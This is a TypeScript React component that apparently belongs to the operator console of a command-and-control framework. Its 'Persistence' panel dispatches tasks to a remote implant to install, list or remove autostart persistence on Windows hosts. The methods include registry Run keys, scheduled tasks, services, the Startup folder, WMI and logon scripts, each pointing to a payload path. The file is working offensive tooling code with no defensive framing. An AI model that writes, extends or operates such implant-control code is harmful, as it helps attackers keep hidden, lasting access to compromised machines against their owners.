import { useState } from 'react';
import { taskClient } from '../../api';

interface Props {
  sessionId: string;
}

function hexToUint8Array(hex: string): Uint8Array<ArrayBuffer> {
  const buffer = new ArrayBuffer(hex.length / 2);
  const bytes = new Uint8Array(buffer);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

type PersistMethod = 'RegRun' | 'RegRunOnce' | 'SchTask' | 'Service' | 'Startup' | 'WMI' | 'LogonScript';

const METHODS: PersistMethod[] = ['RegRun', 'RegRunOnce', 'SchTask', 'Service', 'Startup', 'WMI', 'LogonScript'];

interface PersistEntry {
  name: string;
  method: string;
  path: string;
  trigger?: string;
}

export function PersistencePanel({ sessionId }: Props) {
  // Install form
  const [method, setMethod] = useState<PersistMethod>('RegRun');
  const [name, setName] = useState('');
  const [payloadPath, setPayloadPath] = useState('');
  const [trigger, setTrigger] = useState('');

  // Remove form
  const [removeName, setRemoveName] = useState('');

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [taskId, setTaskId] = useState<string | null>(null);
  const [entries, setEntries] = useState<PersistEntry[]>([]);
  const [statusMsg, setStatusMsg] = useState<string | null>(null);

  const dispatchTask = async (payload: string) => {
    setLoading(true);
    setError(null);
    setStatusMsg(null);
    try {
      const encoder = new TextEncoder();
      const taskData = encoder.encode(payload) as Uint8Array<ArrayBuffer>;

      const response = await taskClient.dispatchTask({
        implantId: { value: hexToUint8Array(sessionId) },
        taskType: 'persist',
        taskData,
      });

      const id = response.taskId
        ? Array.from(response.taskId.value).map(b => b.toString(16).padStart(2, '0')).join('')
        : '';
      setTaskId(id);
      return id;
    } catch (err: any) {
      setError(err.message || 'Failed to dispatch task');
      return null;
    } finally {
      setLoading(false);
    }
  };

  const handleInstall = async () => {
    if (!name.trim()) { setError('Name is required'); return; }
    if (!payloadPath.trim()) { setError('Payload path is required'); return; }
    const parts = ['install', method, name.trim(), payloadPath.trim(), trigger.trim()];
    const id = await dispatchTask(parts.join('\0'));
    if (id) {
      setStatusMsg(`Install task dispatched for "${name}" via ${method}.`);
      setName('');
      setPayloadPath('');
      setTrigger('');
    }
  };

  const handleList = async () => {
    const id = await dispatchTask('list');
    if (id) {
      setStatusMsg('List task dispatched — results will appear in the task stream.');
      setEntries([{ name: '(pending)', method: '—', path: '—', trigger: '—' }]);
    }
  };

  const handleRemove = async () => {
    if (!removeName.trim()) { setError('Name is required to remove'); return; }
    const parts = ['remove', removeName.trim()];
    const id = await dispatchTask(parts.join('\0'));
    if (id) {
      setStatusMsg(`Remove task dispatched for "${removeName}".`);
      setEntries(prev => prev.filter(e => e.name !== removeName.trim()));
      setRemoveName('');
    }
  };

  return (
    <div className="p-4 space-y-5">
      <h3 className="text-ctp-text font-semibold text-sm uppercase tracking-wide">Persistence</h3>

      {/* Install section */}
      <div className="space-y-3 p-3 rounded border border-ctp-surface2 bg-ctp-surface0/40">
        <p className="text-xs font-medium text-ctp-subtext0 uppercase tracking-wide">Install</p>
        <div className="grid grid-cols-2 gap-2">
          <div>
            <label className="block text-xs text-ctp-subtext0 mb-1">Method</label>
            <select
              value={method}
              onChange={e => setMethod(e.target.value as PersistMethod)}
              className="w-full px-3 py-2 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm focus:outline-none focus:border-ctp-blue"
            >
              {METHODS.map(m => (
                <option key={m} value={m}>{m}</option>
              ))}
            </select>
          </div>
          <div>
            <label className="block text-xs text-ctp-subtext0 mb-1">Name</label>
            <input
              type="text"
              value={name}
              onChange={e => setName(e.target.value)}
              placeholder="MyPersistence"
              className="w-full px-3 py-2 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm placeholder-ctp-subtext0 focus:outline-none focus:border-ctp-blue"
            />
          </div>
          <div>
            <label className="block text-xs text-ctp-subtext0 mb-1">Payload Path</label>
            <input
              type="text"
              value={payloadPath}
              onChange={e => setPayloadPath(e.target.value)}
              placeholder="C:\Users\user\payload.exe"
              className="w-full px-3 py-2 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm placeholder-ctp-subtext0 focus:outline-none focus:border-ctp-blue"
            />
          </div>
          <div>
            <label className="block text-xs text-ctp-subtext0 mb-1">Trigger (optional)</label>
            <input
              type="text"
              value={trigger}
              onChange={e => setTrigger(e.target.value)}
              placeholder="onlogon"
              className="w-full px-3 py-2 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm placeholder-ctp-subtext0 focus:outline-none focus:border-ctp-blue"
            />
          </div>
        </div>
        <button
          onClick={handleInstall}
          disabled={loading}
          className="px-4 py-2 rounded text-sm font-medium bg-ctp-green text-ctp-base hover:bg-ctp-green/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {loading ? 'Dispatching...' : 'Install'}
        </button>
      </div>

      {/* List / Remove section */}
      <div className="flex gap-3 items-end">
        <button
          onClick={handleList}
          disabled={loading}
          className="px-4 py-2 rounded text-sm font-medium bg-ctp-blue text-ctp-base hover:bg-ctp-blue/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
        >
          List Active
        </button>
        <div className="flex gap-2 flex-1">
          <input
            type="text"
            value={removeName}
            onChange={e => setRemoveName(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && handleRemove()}
            placeholder="Name to remove..."
            className="flex-1 px-3 py-2 rounded bg-ctp-surface0 border border-ctp-surface2 text-ctp-text text-sm placeholder-ctp-subtext0 focus:outline-none focus:border-ctp-blue"
          />
          <button
            onClick={handleRemove}
            disabled={loading || !removeName.trim()}
            className="px-4 py-2 rounded text-sm font-medium bg-ctp-red text-ctp-base hover:bg-ctp-red/80 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Remove
          </button>
        </div>
      </div>

      {error && (
        <div className="px-3 py-2 rounded bg-ctp-red/20 text-ctp-red text-sm border border-ctp-red/30">
          {error}
        </div>
      )}

      {statusMsg && (
        <div className="px-3 py-2 rounded bg-ctp-green/10 text-ctp-green text-sm border border-ctp-green/30">
          {statusMsg}
        </div>
      )}

      {taskId && (
        <div className="text-xs text-ctp-subtext0">
          Task ID: <span className="font-mono text-ctp-blue">{taskId}</span>
        </div>
      )}

      {/* Active persistence list */}
      {entries.length > 0 && (
        <div className="rounded border border-ctp-surface2 overflow-hidden">
          <table className="w-full text-sm">
            <thead className="bg-ctp-surface0">
              <tr className="text-left text-ctp-subtext0">
                <th className="px-3 py-2 font-medium">Name</th>
                <th className="px-3 py-2 font-medium">Method</th>
                <th className="px-3 py-2 font-medium">Path</th>
                <th className="px-3 py-2 font-medium">Trigger</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-ctp-surface0">
              {entries.map((entry, i) => (
                <tr key={i} className="hover:bg-ctp-surface0/50">
                  <td className="px-3 py-2 text-ctp-text text-xs font-mono">{entry.name}</td>
                  <td className="px-3 py-2 text-ctp-subtext0 text-xs">{entry.method}</td>
                  <td className="px-3 py-2 text-ctp-subtext0 text-xs font-mono">{entry.path}</td>
                  <td className="px-3 py-2 text-ctp-subtext0 text-xs">{entry.trigger ?? '—'}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
